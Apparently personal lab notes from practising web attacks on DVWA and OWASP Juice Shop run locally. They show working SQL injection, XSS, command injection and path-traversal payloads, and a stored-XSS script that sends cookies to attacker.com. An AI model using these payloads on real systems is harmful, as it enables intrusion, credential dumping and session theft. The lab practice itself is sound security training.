# Testing Notes

Just my working notes as I went through each vulnerability. Not super polished but wanted to keep a record of what I tried and what worked.

**Setup:** DVWA + Juice Shop running in Docker, Burp Suite as proxy, security level set to Low on DVWA.

---

## DVWA

### SQL Injection

Endpoint: `http://localhost/dvwa/vulnerabilities/sqli/?id=X&Submit=Submit`

Started with just entering `1` — got back `admin/admin`. Then tried the basic injection:

```
' OR '1'='1        → returned all 5 users
' OR 1=1-- -       → same, slightly cleaner syntax
```

Checked column count with ORDER BY:
```
' ORDER BY 1-- -   → worked
' ORDER BY 2-- -   → worked
' ORDER BY 3-- -   → error → confirmed 2 columns
```

Used UNION SELECT to pull data:
```
' UNION SELECT null,database()-- -              → got: dvwa
' UNION SELECT user,password FROM users-- -     → dumped all usernames + MD5 hashes
```

Hashes I got (all MD5, easy to crack):
- admin: 5f4dcc3b5aa765d61d8327deb882cf99 (= "password")
- gordonb: e99a18c428cb38d5f260853678922e03

Also ran SQLmap to double-check and it confirmed everything.

---

### Reflected XSS

Endpoint: `http://localhost/dvwa/vulnerabilities/xss_r/?name=`

Basic script tag fired an alert:
```html
<script>alert('XSS')</script>
```

Also tested img onerror (useful when script tags are blocked):
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

All three worked. The payload is just reflected straight back into the page with no encoding.

---

### Stored XSS

Endpoint: DVWA → XSS Stored (guestbook)

Name field has maxlength=10 in HTML but that's just client-side. Removed it with browser devtools then submitted:
```html
<b style="color:red">[STORED XSS]</b>
```

Shows up every time the page loads. In a real scenario you'd use something like:
```html
<script>document.location='http://attacker.com?c='+document.cookie</script>
```
to steal session cookies.

---

### Command Injection

Endpoint: DVWA → Command Injection (ping)

The app passes input straight to a shell command. Tried:
```
127.0.0.1; id
```
Got back:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then tried:
```
127.0.0.1; cat /etc/passwd
```
Printed the whole passwd file. Full RCE on the web server.

---

### File Inclusion (LFI)

Endpoint: `http://localhost/dvwa/vulnerabilities/fi/?page=`

The `page` parameter just includes whatever file you tell it to:
```
?page=../../../../../../etc/passwd
```
Printed /etc/passwd in the browser. `allow_url_include` was disabled so no RFI, but LFI alone is bad enough.

---

## OWASP Juice Shop

### SQLi Login Bypass

Login form at `http://localhost:3000/#/login`

Entered in email field:
```
' OR 1=1-- -
```
Password: anything

Got logged in as admin immediately. Juice Shop showed a challenge notification confirming it.

---

### Admin Panel (Broken Access Control)

After logging in as admin via SQLi, navigated directly to:
```
http://localhost:3000/#/administration
```

Shows all registered user emails and all customer reviews. Before logging in this gave a 403.

---

## Fuzzer results

Ran `fuzzer.py` against DVWA with security=low:
- SQLi: detected from error string "You have an error in your SQL syntax"
- XSS: payload reflected back unmodified
- Command injection: "uid=33" in response
- LFI: "root:x:" in response

Next thing I want to add: proper CSRF testing.
